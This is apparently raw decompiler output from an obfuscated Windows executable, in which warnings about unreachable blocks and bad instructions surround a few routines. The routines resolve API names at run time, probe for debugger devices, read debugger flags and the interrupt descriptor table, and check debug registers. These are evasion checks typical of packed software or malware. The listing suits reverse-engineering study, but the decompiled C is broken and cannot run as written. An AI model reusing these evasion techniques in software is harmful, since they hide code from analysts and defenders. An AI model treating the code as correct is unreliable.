/* WARNING: Removing unreachable block (ram,0x00425e28) */
/* WARNING: Removing unreachable block (ram,0x00425dee) */
/* WARNING: Removing unreachable block (ram,0x00425dc0) */
/* WARNING: Removing unreachable block (ram,0x00425da8) */
/* WARNING: Removing unreachable block (ram,0x00425d0d) */
/* WARNING: Removing unreachable block (ram,0x00425ca2) */
/* WARNING: Removing unreachable block (ram,0x00425c66) */
/* WARNING: Removing unreachable block (ram,0x00425c38) */
/* WARNING: Removing unreachable block (ram,0x00425bef) */
/* WARNING: Removing unreachable block (ram,0x00425b6d) */
/* WARNING: Removing unreachable block (ram,0x00425b55) */
/* WARNING: Removing unreachable block (ram,0x00425b29) */
/* WARNING: Removing unreachable block (ram,0x00425adf) */
/* WARNING: Removing unreachable block (ram,0x00425ad3) */
/* WARNING: Removing unreachable block (ram,0x00425abb) */
/* WARNING: Removing unreachable block (ram,0x00425aa3) */
/* WARNING: Removing unreachable block (ram,0x00425a8b) */
/* WARNING: Removing unreachable block (ram,0x00425a73) */
/* WARNING: Removing unreachable block (ram,0x00425a5b) */
/* WARNING: Removing unreachable block (ram,0x00425a43) */
/* WARNING: Removing unreachable block (ram,0x00425a2b) */
/* WARNING: Removing unreachable block (ram,0x00425a1f) */
/* WARNING: Removing unreachable block (ram,0x00425a37) */
/* WARNING: Removing unreachable block (ram,0x00425a4f) */
/* WARNING: Removing unreachable block (ram,0x00425a67) */
/* WARNING: Removing unreachable block (ram,0x00425a7f) */
/* WARNING: Removing unreachable block (ram,0x00425a97) */
/* WARNING: Removing unreachable block (ram,0x00425aaf) */
/* WARNING: Removing unreachable block (ram,0x00425ac7) */
/* WARNING: Removing unreachable block (ram,0x00425b0a) */
/* WARNING: Removing unreachable block (ram,0x00425b61) */
/* WARNING: Removing unreachable block (ram,0x00425b79) */
/* WARNING: Removing unreachable block (ram,0x00425b85) */
/* WARNING: Removing unreachable block (ram,0x00425be3) */
/* WARNING: Removing unreachable block (ram,0x00425c2c) */
/* WARNING: Removing unreachable block (ram,0x00425c72) */
/* WARNING: Removing unreachable block (ram,0x00425cd3) */
/* WARNING: Removing unreachable block (ram,0x00425d6b) */
/* WARNING: Removing unreachable block (ram,0x00425db4) */
/* WARNING: Removing unreachable block (ram,0x00425dcc) */
/* WARNING: Removing unreachable block (ram,0x00425d3b) */
/* WARNING: Removing unreachable block (ram,0x00425e1c) */
/* WARNING: Removing unreachable block (ram,0x00425e34) */
/* WARNING: Removing unreachable block (ram,0x00425e4c) */
/* WARNING: Removing unreachable block (ram,0x00425e64) */
/* WARNING: Removing unreachable block (ram,0x00425ebf) */
/* WARNING: Removing unreachable block (ram,0x00425ed7) */
/* WARNING: Removing unreachable block (ram,0x00425ef9) */
/* WARNING: Removing unreachable block (ram,0x00425f3e) */
/* WARNING: Removing unreachable block (ram,0x00425f56) */
/* WARNING: Removing unreachable block (ram,0x00425f8f) */
/* WARNING: Removing unreachable block (ram,0x00425fb1) */
/* WARNING: Removing unreachable block (ram,0x00425ff1) */
/* WARNING: Removing unreachable block (ram,0x00426009) */
/* WARNING: Removing unreachable block (ram,0x00426021) */
/* WARNING: Removing unreachable block (ram,0x00426039) */
/* WARNING: Removing unreachable block (ram,0x00426051) */
/* WARNING: Removing unreachable block (ram,0x00426069) */
/* WARNING: Removing unreachable block (ram,0x00426081) */
/* WARNING: Removing unreachable block (ram,0x0042608d) */
/* WARNING: Removing unreachable block (ram,0x004260a5) */
/* WARNING: Removing unreachable block (ram,0x004260bd) */
/* WARNING: Removing unreachable block (ram,0x004260e1) */
/* WARNING: Removing unreachable block (ram,0x00425f4a) */
/* WARNING: Removing unreachable block (ram,0x00425dfa) */
/* WARNING: Removing unreachable block (ram,0x00425cdf) */
/* WARNING: Removing unreachable block (ram,0x00425e7a) */
/* WARNING: Removing unreachable block (ram,0x00425e81) */
/* WARNING: Removing unreachable block (ram,0x00425e91) */
/* WARNING: Removing unreachable block (ram,0x00425e88) */
/* WARNING: Removing unreachable block (ram,0x00425e99) */
/* WARNING: Removing unreachable block (ram,0x00425e9d) */
/* WARNING: Removing unreachable block (ram,0x00425e94) */
/* WARNING: Removing unreachable block (ram,0x00425eaf) */
/* WARNING: Removing unreachable block (ram,0x00425eaa) */
/* WARNING: Removing unreachable block (ram,0x00425ebb) */
/* WARNING: Removing unreachable block (ram,0x00425eb3) */
/* WARNING: Removing unreachable block (ram,0x00425eb6) */
/* WARNING: Removing unreachable block (ram,0x00425ec7) */
/* WARNING: Removing unreachable block (ram,0x00425ec2) */
/* WARNING: Removing unreachable block (ram,0x00425ecb) */
/* WARNING: Removing unreachable block (ram,0x00425d19) */
/* WARNING: Removing unreachable block (ram,0x00425c44) */
/* WARNING: Removing unreachable block (ram,0x00425c7e) */
/* WARNING: Removing unreachable block (ram,0x004260f9) */
/* WARNING: Removing unreachable block (ram,0x00426099) */
/* WARNING: Removing unreachable block (ram,0x00425bfb) */
/* WARNING: Removing unreachable block (ram,0x004260d5) */
/* WARNING: Removing unreachable block (ram,0x00425ceb) */
/* WARNING: Removing unreachable block (ram,0x00425b91) */
/* WARNING: Removing unreachable block (ram,0x00425aeb) */
/* WARNING: Removing unreachable block (ram,0x00425f83) */
/* WARNING: Removing unreachable block (ram,0x00425f6b) */
/* WARNING: Removing unreachable block (ram,0x00425fa5) */
/* WARNING: Removing unreachable block (ram,0x00426105) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 * FUN_004259fe(void)

{
  char cVar1;
  LPCSTR pCVar2;
  HMODULE hModule;
  FARPROC pFVar3;
  undefined1 *puVar4;
  char *pcVar5;
  undefined4 uVar6;
  BOOL BVar7;
  uint extraout_ECX;
  int unaff_EDI;
  undefined1 uVar8;
  bool bVar9;
  HANDLE local_b8;

  pCVar2 = FUN_00420230(&DAT_0042ab00);
                    /* WARNING: Bad instruction - Truncating control flow here */
  hModule = GetModuleHandleA(pCVar2);
  uVar8 = (POPCOUNT((uint)hModule & 0xff) & 1U) == 0;
  puVar4 = &stack0xfffffffc;
  if (hModule != (HMODULE)0x0) {
    pCVar2 = FUN_00420230(&DAT_0042ab40);
    bVar9 = (POPCOUNT((uint)&stack0xffffff3c & 0xff) & 1U) == 0;
                    /* WARNING: Bad instruction - Truncating control flow here */
    pFVar3 = GetProcAddress(hModule,pCVar2);
    if ((!bVar9) && (bVar9)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
      halt_baddata();
    }
    uVar8 = (POPCOUNT((uint)pFVar3 & 0xff) & 1U) == 0;
    puVar4 = &stack0xfffffffc;
    if (pFVar3 != (FARPROC)0x0) {
      puVar4 = FUN_00420230((char *)0x42ab10);
      local_b8 = (HANDLE)(*pFVar3)(puVar4,0xc0000000,3);
                    /* WARNING: Bad instruction - Truncating control flow here */
      if (local_b8 == (HANDLE)0xffffffff) {
        puVar4 = FUN_00420230((char *)0x42ab20);
                    /* WARNING: Bad instruction - Truncating control flow here */
        local_b8 = (HANDLE)(*pFVar3)(puVar4,0xc0000000,3,0,3);
                    /* WARNING: Bad instruction - Truncating control flow here */
        if (local_b8 != (HANDLE)0xffffffff) {
          CloseHandle(local_b8);
        }
      }
      else {
        CloseHandle(local_b8);
      }
      uVar8 = (POPCOUNT((int)local_b8 + 1U & 0xff) & 1U) == 0;
                    /* WARNING: Bad instruction - Truncating control flow here */
      if ((int)local_b8 + 1U == 0) {
        pcVar5 = FUN_00420230((char *)0x42ab30);
        puVar4 = (undefined1 *)((uint)&stack0xfffffffc | extraout_ECX);
        *pcVar5 = *pcVar5 + (char)pcVar5;
        cVar1 = (char)(extraout_ECX >> 8);
        pcVar5[0x30] = pcVar5[0x30] + cVar1;
        *(char **)(unaff_EDI + 1) = pcVar5;
        cVar1 = (char)pcVar5 + cVar1;
        bVar9 = (POPCOUNT(cVar1) & 1U) == 0;
        *(uint *)(puVar4 + -0xb0) = CONCAT31((int3)((uint)pcVar5 >> 8),cVar1);
        uVar6 = (**(code **)(puVar4 + -0xac))(*(undefined4 *)(puVar4 + -0xb0),0xc0000000,3,0,3);
        *(undefined4 *)(puVar4 + -0xb4) = uVar6;
        if ((!bVar9) && (bVar9)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
          halt_baddata();
        }
        uVar8 = (POPCOUNT(*(int *)(puVar4 + -0xb4) + 1U & 0xff) & 1U) == 0;
        if (*(int *)(puVar4 + -0xb4) + 1U != 0) {
          CloseHandle(*(HANDLE *)(puVar4 + -0xb4));
        }
      }
      else {
        CloseHandle(local_b8);
        puVar4 = &stack0xfffffffc;
      }
    }
  }
  DAT_0042ec2c = 1;
  if ((!(bool)uVar8) && ((bool)uVar8)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
    halt_baddata();
  }
  *(undefined4 *)(puVar4 + -0x94) = 0x94;
  DAT_0042ec2c = 1;
  BVar7 = GetVersionExA((LPOSVERSIONINFOA)(puVar4 + -0x94));
  if ((BVar7 != 0) && (*(int *)(puVar4 + -0x84) != 1)) {
    *(undefined4 *)(puVar4 + -0xb4) = 5;
  }
  **(uint **)(puVar4 + 8) = **(uint **)(puVar4 + 8) & *(uint *)(puVar4 + -0xb4);
  return (undefined4 *)(uint)(*(int *)(puVar4 + -0xb4) != -1);
}



/* VA 00426120 */

/* WARNING: Instruction at (ram,0x00426160) overlaps instruction at (ram,0x0042615f)
    */
/* WARNING: Removing unreachable block (ram,0x00426139) */
/* WARNING: Removing unreachable block (ram,0x00426145) */
/* WARNING: Removing unreachable block (ram,0x00426151) */
/* WARNING: Removing unreachable block (ram,0x0042615d) */
/* WARNING: Restarted to delay deadcode elimination for space: stack */

undefined8 __fastcall FUN_00426120(undefined4 param_1,undefined4 param_2)

{
  undefined4 in_EAX;
  int unaff_FS_OFFSET;
  ushort local_8;

  local_8 = (ushort)(*(int *)(*(int *)(unaff_FS_OFFSET + 0x18) + 0x20) != 0);
  return CONCAT44(param_2,CONCAT22((short)((uint)in_EAX >> 0x10),local_8));
}



/* VA 0042617d */

/* WARNING: Instruction at (ram,0x00426294) overlaps instruction at (ram,0x00426291)
    */
/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Removing unreachable block (ram,0x0042628f) */
/* WARNING: Removing unreachable block (ram,0x0042626b) */
/* WARNING: Removing unreachable block (ram,0x00426267) */
/* WARNING: Removing unreachable block (ram,0x0042625b) */
/* WARNING: Removing unreachable block (ram,0x0042625f) */
/* WARNING: Removing unreachable block (ram,0x0042623b) */
/* WARNING: Removing unreachable block (ram,0x00426237) */
/* WARNING: Removing unreachable block (ram,0x004261e5) */
/* WARNING: Removing unreachable block (ram,0x004261cd) */
/* WARNING: Removing unreachable block (ram,0x004261b5) */
/* WARNING: Removing unreachable block (ram,0x0042619d) */
/* WARNING: Removing unreachable block (ram,0x00426191) */
/* WARNING: Removing unreachable block (ram,0x004261a9) */
/* WARNING: Removing unreachable block (ram,0x004261c1) */
/* WARNING: Removing unreachable block (ram,0x004261d9) */
/* WARNING: Removing unreachable block (ram,0x00426243) */
/* WARNING: Removing unreachable block (ram,0x00426247) */
/* WARNING: Removing unreachable block (ram,0x0042624f) */
/* WARNING: Removing unreachable block (ram,0x00426253) */
/* WARNING: Removing unreachable block (ram,0x00426273) */
/* WARNING: Removing unreachable block (ram,0x00426277) */
/* WARNING: Removing unreachable block (ram,0x0042627f) */
/* WARNING: Removing unreachable block (ram,0x00426283) */
/* WARNING: Removing unreachable block (ram,0x0042628b) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* WARNING: Restarted to delay deadcode elimination for space: stack */

undefined8 __fastcall
FUN_0042617d(undefined4 param_1,undefined4 param_2,undefined4 *param_3,undefined4 *param_4)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  bool bVar4;
  uint in_EAX;
  uint uVar5;
  undefined4 *puVar6;
  undefined4 in_DR2;
  undefined4 local_1c;
  undefined2 uStack_16;
  undefined2 uStack_14;

  if (param_4 == (undefined4 *)0x0) {
    uVar5 = in_EAX & 0xffff0000;
  }
  else {
    if (param_3 == (undefined4 *)0x1010) {
      bVar4 = false;
    }
    else {
      if (param_3 != (undefined4 *)0x1011) {
        uVar5 = (uint)param_3 & 0xffff0000;
        goto LAB_0042631c;
      }
      bVar4 = true;
      param_2 = *param_4;
      local_1c = param_2;
    }
    uVar1 = InterruptDescriptorTableRegister();
    uStack_16 = (undefined2)((uint)uVar1 >> 0x10);
    puVar6 = (undefined4 *)
             CONCAT22((short)((uint)*(undefined4 *)((undefined2 *)CONCAT22(uStack_14,uStack_16) + 2)
                             >> 0x10),*(undefined2 *)CONCAT22(uStack_14,uStack_16));
    uVar1 = *puVar6;
    uVar3 = puVar6[1];
    *(undefined4 *)((int)puVar6 + 1) = 0xcf530e58;
    *(undefined1 *)puVar6 = 0x58;
    if (!bVar4) {
      local_1c = in_DR2;
    }
    uVar2 = InterruptDescriptorTableRegister();
    uStack_16 = (undefined2)((uint)uVar2 >> 0x10);
    puVar6 = (undefined4 *)
             CONCAT22((short)((uint)*(undefined4 *)((undefined2 *)CONCAT22(uStack_14,uStack_16) + 2)
                             >> 0x10),*(undefined2 *)CONCAT22(uStack_14,uStack_16));
    *(undefined4 *)((int)puVar6 + 1) = 0xcf535158;
    *(undefined1 *)puVar6 = 0x58;
    *puVar6 = uVar1;
    puVar6[1] = uVar3;
    if (!bVar4) {
      *param_4 = local_1c;
      param_3 = param_4;
    }
    uVar5 = CONCAT22((short)((uint)param_3 >> 0x10),1);
  }
LAB_0042631c:
  return CONCAT44(param_2,uVar5);
}



/* VA 00426323 */

/* WARNING: Instruction at (ram,0x00426903) overlaps instruction at (ram,0x00426901)
    */
/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Removing unreachable block (ram,0x004263cd) */
/* WARNING: Removing unreachable block (ram,0x004263d1) */
/* WARNING: Removing unreachable block (ram,0x004263b5) */
/* WARNING: Removing unreachable block (ram,0x004263b9) */
/* WARNING: Removing unreachable block (ram,0x00426439) */
/* WARNING: Removing unreachable block (ram,0x0042643d) */
/* WARNING: Removing unreachable block (ram,0x004269ec) */
/* WARNING: Removing unreachable block (ram,0x004269d4) */
/* WARNING: Removing unreachable block (ram,0x004269bc) */
/* WARNING: Removing unreachable block (ram,0x004269a4) */
/* WARNING: Removing unreachable block (ram,0x0042698c) */
/* WARNING: Removing unreachable block (ram,0x00426950) */
/* WARNING: Removing unreachable block (ram,0x00426944) */
/* WARNING: Removing unreachable block (ram,0x00426900) */
/* WARNING: Removing unreachable block (ram,0x0042691c) */
/* WARNING: Removing unreachable block (ram,0x00426917) */
/* WARNING: Removing unreachable block (ram,0x00426928) */
/* WARNING: Removing unreachable block (ram,0x0042692c) */
/* WARNING: Removing unreachable block (ram,0x004268e8) */
/* WARNING: Removing unreachable block (ram,0x004268b8) */
/* WARNING: Removing unreachable block (ram,0x0042686d) */
/* WARNING: Removing unreachable block (ram,0x00426861) */
/* WARNING: Removing unreachable block (ram,0x00426849) */
/* WARNING: Removing unreachable block (ram,0x00426831) */
/* WARNING: Removing unreachable block (ram,0x00426819) */
/* WARNING: Removing unreachable block (ram,0x00426801) */
/* WARNING: Removing unreachable block (ram,0x00426799) */
/* WARNING: Removing unreachable block (ram,0x00426781) */
/* WARNING: Removing unreachable block (ram,0x00426769) */
/* WARNING: Removing unreachable block (ram,0x00426739) */
/* WARNING: Removing unreachable block (ram,0x00426708) */
/* WARNING: Removing unreachable block (ram,0x004266b3) */
/* WARNING: Removing unreachable block (ram,0x0042669b) */
/* WARNING: Removing unreachable block (ram,0x00426683) */
/* WARNING: Removing unreachable block (ram,0x0042664c) */
/* WARNING: Removing unreachable block (ram,0x00426634) */
/* WARNING: Removing unreachable block (ram,0x004265ee) */
/* WARNING: Removing unreachable block (ram,0x004265b5) */
/* WARNING: Removing unreachable block (ram,0x0042659d) */
/* WARNING: Removing unreachable block (ram,0x00426564) */
/* WARNING: Removing unreachable block (ram,0x00426536) */
/* WARNING: Removing unreachable block (ram,0x0042651e) */
/* WARNING: Removing unreachable block (ram,0x00426506) */
/* WARNING: Removing unreachable block (ram,0x004264ee) */
/* WARNING: Removing unreachable block (ram,0x004264d6) */
/* WARNING: Removing unreachable block (ram,0x004264be) */
/* WARNING: Removing unreachable block (ram,0x004264a6) */
/* WARNING: Removing unreachable block (ram,0x00426491) */
/* WARNING: Removing unreachable block (ram,0x00426485) */
/* WARNING: Removing unreachable block (ram,0x0042646d) */
/* WARNING: Removing unreachable block (ram,0x0042640d) */
/* WARNING: Removing unreachable block (ram,0x00426401) */
/* WARNING: Removing unreachable block (ram,0x004263e5) */
/* WARNING: Removing unreachable block (ram,0x004263e9) */
/* WARNING: Removing unreachable block (ram,0x004263c1) */
/* WARNING: Removing unreachable block (ram,0x00426398) */
/* WARNING: Removing unreachable block (ram,0x00426380) */
/* WARNING: Removing unreachable block (ram,0x00426368) */
/* WARNING: Removing unreachable block (ram,0x00426344) */
/* WARNING: Removing unreachable block (ram,0x0042635c) */
/* WARNING: Removing unreachable block (ram,0x00426374) */
/* WARNING: Removing unreachable block (ram,0x0042638c) */
/* WARNING: Removing unreachable block (ram,0x004263d9) */
/* WARNING: Removing unreachable block (ram,0x004263dd) */
/* WARNING: Removing unreachable block (ram,0x004263f5) */
/* WARNING: Removing unreachable block (ram,0x00426445) */
/* WARNING: Removing unreachable block (ram,0x00426461) */
/* WARNING: Removing unreachable block (ram,0x00426479) */
/* WARNING: Removing unreachable block (ram,0x004264b2) */
/* WARNING: Removing unreachable block (ram,0x004264ca) */
/* WARNING: Removing unreachable block (ram,0x004264e2) */
/* WARNING: Removing unreachable block (ram,0x004264fa) */
/* WARNING: Removing unreachable block (ram,0x00426512) */
/* WARNING: Removing unreachable block (ram,0x0042652a) */
/* WARNING: Removing unreachable block (ram,0x00426542) */
/* WARNING: Removing unreachable block (ram,0x00426570) */
/* WARNING: Removing unreachable block (ram,0x004265a9) */
/* WARNING: Removing unreachable block (ram,0x004265c1) */
/* WARNING: Removing unreachable block (ram,0x004265d6) */
/* WARNING: Removing unreachable block (ram,0x00426640) */
/* WARNING: Removing unreachable block (ram,0x00426658) */
/* WARNING: Removing unreachable block (ram,0x00426664) */
/* WARNING: Removing unreachable block (ram,0x004266a7) */
/* WARNING: Removing unreachable block (ram,0x004266bf) */
/* WARNING: Removing unreachable block (ram,0x004266cb) */
/* WARNING: Removing unreachable block (ram,0x00426745) */
/* WARNING: Removing unreachable block (ram,0x00426775) */
/* WARNING: Removing unreachable block (ram,0x0042678d) */
/* WARNING: Removing unreachable block (ram,0x004267a5) */
/* WARNING: Removing unreachable block (ram,0x004267b1) */
/* WARNING: Removing unreachable block (ram,0x004267f5) */
/* WARNING: Removing unreachable block (ram,0x0042680d) */
/* WARNING: Removing unreachable block (ram,0x00426825) */
/* WARNING: Removing unreachable block (ram,0x0042683d) */
/* WARNING: Removing unreachable block (ram,0x00426855) */
/* WARNING: Removing unreachable block (ram,0x00426891) */
/* WARNING: Removing unreachable block (ram,0x004268ac) */
/* WARNING: Removing unreachable block (ram,0x004268dc) */
/* WARNING: Removing unreachable block (ram,0x00426920) */
/* WARNING: Removing unreachable block (ram,0x00426923) */
/* WARNING: Removing unreachable block (ram,0x00426934) */
/* WARNING: Removing unreachable block (ram,0x0042692f) */
/* WARNING: Removing unreachable block (ram,0x00426940) */
/* WARNING: Removing unreachable block (ram,0x00426938) */
/* WARNING: Removing unreachable block (ram,0x0042693b) */
/* WARNING: Removing unreachable block (ram,0x0042694c) */
/* WARNING: Removing unreachable block (ram,0x00426947) */
/* WARNING: Removing unreachable block (ram,0x00426958) */
/* WARNING: Removing unreachable block (ram,0x0042695c) */
/* WARNING: Removing unreachable block (ram,0x00426953) */
/* WARNING: Removing unreachable block (ram,0x00426964) */
/* WARNING: Removing unreachable block (ram,0x0042695f) */
/* WARNING: Removing unreachable block (ram,0x00426968) */
/* WARNING: Removing unreachable block (ram,0x00426980) */
/* WARNING: Removing unreachable block (ram,0x00426998) */
/* WARNING: Removing unreachable block (ram,0x004269b0) */
/* WARNING: Removing unreachable block (ram,0x004269c8) */
/* WARNING: Removing unreachable block (ram,0x004269e0) */
/* WARNING: Removing unreachable block (ram,0x00426751) */
/* WARNING: Removing unreachable block (ram,0x00426451) */
/* WARNING: Removing unreachable block (ram,0x00426455) */
/* WARNING: Removing unreachable block (ram,0x004263fd) */
/* WARNING: Removing unreachable block (ram,0x004263f1) */
/* WARNING: Removing unreachable block (ram,0x00426409) */
/* WARNING: Removing unreachable block (ram,0x00426714) */
/* WARNING: Removing unreachable block (ram,0x00426350) */
/* WARNING: Removing unreachable block (ram,0x004266d7) */
/* WARNING: Removing unreachable block (ram,0x004268c4) */
/* WARNING: Removing unreachable block (ram,0x004269f8) */
/* WARNING: Removing unreachable block (ram,0x004265e2) */
/* WARNING: Removing unreachable block (ram,0x0042645d) */
/* WARNING: Removing unreachable block (ram,0x004264a2) */
/* WARNING: Removing unreachable block (ram,0x0042668f) */
/* WARNING: Removing unreachable block (ram,0x004268f4) */
/* WARNING: Removing unreachable block (ram,0x00426879) */
/* WARNING: Removing unreachable block (ram,0x0042654e) */
/* WARNING: Removing unreachable block (ram,0x00426610) */
/* WARNING: Removing unreachable block (ram,0x00426974) */
/* WARNING: Removing unreachable block (ram,0x004265fa) */
/* WARNING: Removing unreachable block (ram,0x0042661c) */
/* WARNING: Removing unreachable block (ram,0x00426885) */
/* WARNING: Removing unreachable block (ram,0x00426628) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined8 __fastcall FUN_00426323(uint param_1,undefined4 param_2)

{
  uint uVar1;
  BOOL BVar2;
  LPCSTR lpModuleName;
  LPCSTR lpProcName;
  HMODULE hModule;
  undefined4 *puVar3;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 uVar4;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 uVar5;
  bool bVar6;
  undefined8 uVar7;
  undefined4 *in_stack_00000004;
  uint uStack_ac;
  int local_a0;
  _OSVERSIONINFOA _Stack_9c;
  FARPROC pFStack_8;

  if (sRam0042eb0c == 0) {
    local_a0 = 0;
    FUN_0042617d(&local_a0,param_2,(undefined4 *)0x1010,&local_a0);
    bVar6 = (POPCOUNT(local_a0 + 0x4ceebaU & 0xff) & 1U) == 0;
    if (local_a0 + 0x4ceebaU == 0) {
      sRam0042eb0c = 1;
    }
    _Stack_9c.dwOSVersionInfoSize = 0x94;
                    /* WARNING: Bad instruction - Truncating control flow here */
    if ((!bVar6) && (bVar6)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
      halt_baddata();
    }
    BVar2 = GetVersionExA(&_Stack_9c);
    if ((BVar2 != 0) && (_Stack_9c.dwPlatformId != 1)) {
      local_a0 = -0x4ceeba;
    }
    lpModuleName = FUN_00420230(&DAT_0042ab00);
    lpProcName = FUN_00420230((char *)0x42ab50);
                    /* WARNING: Bad instruction - Truncating control flow here */
    hModule = GetModuleHandleA(lpModuleName);
    pFStack_8 = GetProcAddress(hModule,lpProcName);
    uStack_ac = 0;
                    /* WARNING: Bad instruction - Truncating control flow here */
    uVar4 = extraout_ECX;
    uVar5 = extraout_EDX;
    if (pFStack_8 != (FARPROC)0x0) {
      uStack_ac = (*pFStack_8)();
      uStack_ac = uStack_ac & 0xffff;
      uVar4 = extraout_ECX_00;
      uVar5 = extraout_EDX_00;
    }
    uVar7 = FUN_00426120(uVar4,uVar5);
    puVar3 = (undefined4 *)uVar7;
                    /* WARNING: Bad instruction - Truncating control flow here */
    if (((local_a0 == -0x4ceeba) || ((short)uVar7 != 0)) ||
       (uVar7 = CONCAT44(uStack_ac,puVar3), uStack_ac != 0)) {
      param_2 = (undefined4)((ulonglong)uVar7 >> 0x20);
      uVar1 = CONCAT22((short)((ulonglong)uVar7 >> 0x10),1);
    }
    else {
      if (in_stack_00000004 != (undefined4 *)0x0) {
        *in_stack_00000004 = 0x400;
        bVar6 = (POPCOUNT((uint)in_stack_00000004 & 0xff) & 1U) == 0;
        puVar3 = in_stack_00000004;
        if ((!bVar6) && (bVar6)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
          halt_baddata();
        }
      }
      uVar1 = (uint)puVar3 & 0xffff0000;
      param_2 = 0;
    }
  }
  else {
    uVar1 = 1;
  }
  return CONCAT44(param_2,uVar1);
}



/* VA 00426a10 */

/* WARNING: Instruction at (ram,0x00426feb) overlaps instruction at (ram,0x00426fe9)
    */
/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Removing unreachable block (ram,0x00426fb4) */
/* WARNING: Removing unreachable block (ram,0x00426fa8) */
/* WARNING: Removing unreachable block (ram,0x00426ff9) */
/* WARNING: Removing unreachable block (ram,0x00426ffd) */
/* WARNING: Removing unreachable block (ram,0x00427075) */
/* WARNING: Removing unreachable block (ram,0x0042705d) */
/* WARNING: Removing unreachable block (ram,0x00427045) */
/* WARNING: Removing unreachable block (ram,0x00427005) */
/* WARNING: Removing unreachable block (ram,0x00427009) */
/* WARNING: Removing unreachable block (ram,0x00426fdc) */
/* WARNING: Removing unreachable block (ram,0x00426f96) */
/* WARNING: Removing unreachable block (ram,0x00426f7e) */
/* WARNING: Removing unreachable block (ram,0x00426f66) */
/* WARNING: Removing unreachable block (ram,0x00426f4e) */
/* WARNING: Removing unreachable block (ram,0x00426f29) */
/* WARNING: Removing unreachable block (ram,0x00426ee3) */
/* WARNING: Removing unreachable block (ram,0x00426ed7) */
/* WARNING: Removing unreachable block (ram,0x00426e92) */
/* WARNING: Removing unreachable block (ram,0x00426e65) */
/* WARNING: Removing unreachable block (ram,0x00426e43) */
/* WARNING: Removing unreachable block (ram,0x00426e2b) */
/* WARNING: Removing unreachable block (ram,0x00426e13) */
/* WARNING: Removing unreachable block (ram,0x00426dfb) */
/* WARNING: Removing unreachable block (ram,0x00426de3) */
/* WARNING: Removing unreachable block (ram,0x00426dbf) */
/* WARNING: Removing unreachable block (ram,0x00426da7) */
/* WARNING: Removing unreachable block (ram,0x00426d8f) */
/* WARNING: Removing unreachable block (ram,0x00426d83) */
/* WARNING: Removing unreachable block (ram,0x00426d3f) */
/* WARNING: Removing unreachable block (ram,0x00426d1b) */
/* WARNING: Removing unreachable block (ram,0x00426d03) */
/* WARNING: Removing unreachable block (ram,0x00426cb9) */
/* WARNING: Removing unreachable block (ram,0x00426ca1) */
/* WARNING: Removing unreachable block (ram,0x00426c89) */
/* WARNING: Removing unreachable block (ram,0x00426c71) */
/* WARNING: Removing unreachable block (ram,0x00426c59) */
/* WARNING: Removing unreachable block (ram,0x00426c41) */
/* WARNING: Removing unreachable block (ram,0x00426c29) */
/* WARNING: Removing unreachable block (ram,0x00426c11) */
/* WARNING: Removing unreachable block (ram,0x00426bf9) */
/* WARNING: Removing unreachable block (ram,0x00426be1) */
/* WARNING: Removing unreachable block (ram,0x00426bd5) */
/* WARNING: Removing unreachable block (ram,0x00426bbd) */
/* WARNING: Removing unreachable block (ram,0x00426ba5) */
/* WARNING: Removing unreachable block (ram,0x00426b8d) */
/* WARNING: Removing unreachable block (ram,0x00426b75) */
/* WARNING: Removing unreachable block (ram,0x00426b51) */
/* WARNING: Removing unreachable block (ram,0x00426b39) */
/* WARNING: Removing unreachable block (ram,0x00426b15) */
/* WARNING: Removing unreachable block (ram,0x00426afd) */
/* WARNING: Removing unreachable block (ram,0x00426ae5) */
/* WARNING: Removing unreachable block (ram,0x00426acd) */
/* WARNING: Removing unreachable block (ram,0x00426ab5) */
/* WARNING: Removing unreachable block (ram,0x00426a9d) */
/* WARNING: Removing unreachable block (ram,0x00426a85) */
/* WARNING: Removing unreachable block (ram,0x00426a6d) */
/* WARNING: Removing unreachable block (ram,0x00426a55) */
/* WARNING: Removing unreachable block (ram,0x00426a3d) */
/* WARNING: Removing unreachable block (ram,0x00426a31) */
/* WARNING: Removing unreachable block (ram,0x00426a49) */
/* WARNING: Removing unreachable block (ram,0x00426a61) */
/* WARNING: Removing unreachable block (ram,0x00426a79) */
/* WARNING: Removing unreachable block (ram,0x00426a91) */
/* WARNING: Removing unreachable block (ram,0x00426aa9) */
/* WARNING: Removing unreachable block (ram,0x00426ac1) */
/* WARNING: Removing unreachable block (ram,0x00426ad9) */
/* WARNING: Removing unreachable block (ram,0x00426af1) */
/* WARNING: Removing unreachable block (ram,0x00426b09) */
/* WARNING: Removing unreachable block (ram,0x00426b2d) */
/* WARNING: Removing unreachable block (ram,0x00426b45) */
/* WARNING: Removing unreachable block (ram,0x00426b69) */
/* WARNING: Removing unreachable block (ram,0x00426b81) */
/* WARNING: Removing unreachable block (ram,0x00426b99) */
/* WARNING: Removing unreachable block (ram,0x00426bb1) */
/* WARNING: Removing unreachable block (ram,0x00426bc9) */
/* WARNING: Removing unreachable block (ram,0x00426c05) */
/* WARNING: Removing unreachable block (ram,0x00426c1d) */
/* WARNING: Removing unreachable block (ram,0x00426c35) */
/* WARNING: Removing unreachable block (ram,0x00426c4d) */
/* WARNING: Removing unreachable block (ram,0x00426c65) */
/* WARNING: Removing unreachable block (ram,0x00426c7d) */
/* WARNING: Removing unreachable block (ram,0x00426c95) */
/* WARNING: Removing unreachable block (ram,0x00426cad) */
/* WARNING: Removing unreachable block (ram,0x00426cc5) */
/* WARNING: Removing unreachable block (ram,0x00426d0f) */
/* WARNING: Removing unreachable block (ram,0x00426d27) */
/* WARNING: Removing unreachable block (ram,0x00426d4b) */
/* WARNING: Removing unreachable block (ram,0x00426d57) */
/* WARNING: Removing unreachable block (ram,0x00426d77) */
/* WARNING: Removing unreachable block (ram,0x00426db3) */
/* WARNING: Removing unreachable block (ram,0x00426dcb) */
/* WARNING: Removing unreachable block (ram,0x00426def) */
/* WARNING: Removing unreachable block (ram,0x00426e07) */
